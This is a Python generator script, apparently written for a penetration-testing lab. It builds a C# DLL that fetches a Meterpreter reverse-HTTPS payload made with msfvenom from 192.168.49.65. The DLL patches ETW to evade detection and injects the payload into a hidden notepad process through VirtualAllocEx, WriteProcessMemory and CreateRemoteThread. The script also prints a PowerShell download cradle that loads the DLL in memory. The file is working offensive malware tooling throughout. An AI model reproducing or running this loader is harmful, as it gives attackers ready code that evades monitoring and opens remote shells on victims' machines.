#!/bin/env python3
from ak import *
import os
import subprocess

LHOST = "192.168.49.65"
LPORT = 443
BASE_FILENAME = 'win_ps_dll_runner'
#ENCODER="x64/xor_dynamic"
#ENCODER="x64/zutto_dekiru"
ENCODER="generic/none"
MSFVENOM_CMD = f"msfvenom -a x64 --platform Windows -p windows/x64/meterpreter/reverse_https LHOST={LHOST} LPORT={LPORT} -f raw -e {ENCODER}"
MSFVENOM_CMD = f"msfvenom --platform Windows -p windows/meterpreter/reverse_https LHOST={LHOST} LPORT={LPORT} -f raw -e {ENCODER}"
SVCHOST_PATH = b"C:\\\\Windows\\system32\\svchost.exe"
XOR_KEY = b'\x00'

def generate(shellcode):
  svchost_path = Obfuscator(SVCHOST_PATH)

  template = """
using System;
using System.Net;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace LeMans
{{
    public class Class1
    {{
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetCurrentProcess();

        [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
        static extern UInt32 NtCreateSection(
            ref IntPtr SectionHandle,
            UInt32 DesiredAccess,
            IntPtr ObjectAttributes,
            ref UInt32 MaximumSize,
            UInt32 SectionPageProtection,
            UInt32 AllocationAttributes,
            IntPtr FileHandle);

        [DllImport("ntdll.dll", SetLastError=true)]
        static extern uint NtMapViewOfSection(
            IntPtr SectionHandle,
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            UIntPtr ZeroBits,
            UIntPtr CommitSize,
            out ulong SectionOffset,
            out uint ViewSize,
            uint InheritDisposition,
            uint AllocationType,
            uint Win32Protect);

        [DllImport("ntdll.dll", SetLastError=true)]
        static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);

        [DllImport("ntdll.dll", ExactSpelling=true, SetLastError=false)]
        static extern int NtClose(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(
             IntPtr hProcess,
             IntPtr lpBaseAddress,
             byte[] lpBuffer,
             Int32 nSize,
             out IntPtr lpNumberOfBytesWritten
        );

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess,
       IntPtr lpThreadAttributes, uint dwStackSize, IntPtr
       lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect); 

[DllImport("ntdll.dll", SetLastError=true)]
static extern IntPtr RtlCreateUserThread(IntPtr processHandle, IntPtr threadSecurity, bool createSuspended, Int32 stackZeroBits, IntPtr stackReserved, IntPtr stackCommit, IntPtr startAddress, IntPtr parameter, ref IntPtr threadHandle, IntPtr clientId);

        private static byte[] getETWPayload()
        {{
            if (!is64Bit())
                return Convert.FromBase64String("whQA");
            return Convert.FromBase64String("ww==");
        }}

        private static bool is64Bit()
        {{
            if (IntPtr.Size == 4)
                return false;

            return true;
        }}

          private static void PatchEtw(byte[] patch)
        {{
            try
            {{
                uint oldProtect;

                var ntdll = LoadLibrary("ntdll.dll");
                var etwEventSend =   GetProcAddress(ntdll, "EtwEventWrite");

                VirtualProtect(etwEventSend, (UIntPtr)patch.Length, 0x40, out oldProtect);
                Marshal.Copy(patch, 0, etwEventSend, patch.Length);
            }}
            catch
            {{
                Console.WriteLine("Error unhooking ETW");
            }}

        }}


        public static void ferrari()
        {{
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {{
                return;
            }}

            PatchEtw(getETWPayload());

            string url = "http://192.168.49.65/sc";

            if (!is64Bit())
                url = "http://192.168.49.65/sc32";


            ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
            System.Net.WebClient client = new System.Net.WebClient();
            byte[] buf = client.DownloadData(url);

            // byte[] buf = new byte[] {{ {xor_shellcode} }};

            //for (int i = 0; i < buf.Length; i++)
            //{{
            //    buf[i] = (byte)(((uint)buf[i] ^ {xor_key}) & 0xFF);
            //}}

         // The low-level native APIs NtCreateSection, NtMapViewOfSection, NtUnMapViewOfSection, and NtClose in ntdll.dll can be used as alternatives to VirtualAllocEx and WriteProcessMemory.

          ProcessStartInfo start = new ProcessStartInfo();
          start.Arguments = ""; 
          start.FileName = "notepad.exe";
          start.WindowStyle = ProcessWindowStyle.Hidden;
          start.CreateNoWindow = true;
          int exitCode;


          // Run the external process & wait for it to finish
          using (Process proc = Process.Start(start))
          {{

            Process[] expProc = Process.GetProcessesByName("notepad");
            for (int i = 0; i < expProc.Length; i++) {{
              IntPtr hProcess = OpenProcess(0x001F0FFF, false, expProc[i].Id);
              IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

              IntPtr outSize;
              WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
              IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            }}
               proc.WaitForExit();

               // Retrieve the app's exit code
               exitCode = proc.ExitCode;
          }}

          //  IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
          //  Marshal.Copy(buf, 0, addr, buf.Length);
          //  IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
          //  WaitForSingleObject(hThread, 0xFFFFFFFF);


          //SIZE_T size = 4096;
          //LARGE_INTEGER sectionSize = {{ size }};
          //HANDLE sectionHandle = NULL;
          //PVOID localSectionAddress = NULL, remoteSectionAddress = NULL;
          //
          //// create a memory section
          //NtCreateSection(&sectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
          //
          //// create a view of the memory section in the local process
          //NtMapViewOfSection(sectionHandle, GetCurrentProcess(), &localSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_READWRITE);

          //// create a view of the memory section in the target process
          //HANDLE targetHandle = OpenProcess(PROCESS_ALL_ACCESS, false, 1480);
          //NtMapViewOfSection(sectionHandle, targetHandle, &remoteSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_EXECUTE_READ);

          //// copy shellcode to the local view, which will get reflected in the target process's mapped view
          //memcpy(localSectionAddress, buf, sizeof(buf));
          //
          //HANDLE targetThreadHandle = NULL;
          //RtlCreateUserThread(targetHandle, NULL, FALSE, 0, 0, 0, remoteSectionAddress, NULL, &targetThreadHandle, NULL);

        }}
    }}
}}
""".format(xor_shellcode=shellcode.get_hex_csharp(),xor_svchost_path=svchost_path.get_hex_csharp(), xor_key=shellcode.get_key_csharp())

  print(template)
  f = open(BASE_FILENAME + '.cs', "w")
  f.write(template)
  f.close()

  ps = """
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.65/{fn}')
$assem = [System.Reflection.Assembly]::Load($data)

$class = $assem.GetType('LeMans.Class1')
$method = $class.GetMethod("ferrari")
$method.Invoke(0, $null)
""".format(fn=BASE_FILENAME + '.dll')
  print(ps)

  f = open(BASE_FILENAME + '.sc', "wb")
  f.write(shellcode.get_bytes())
  f.close()

  print("Wrote " + BASE_FILENAME + '.sc')


def compile():
  cmd = f"mcs /target:library {BASE_FILENAME}.cs"
  os.system(cmd)

def main():
  shellcode = ShellCode(MSFVENOM_CMD, xor_key=XOR_KEY)
  generate(shellcode)
  compile() 


if __name__ == "__main__":
  main()
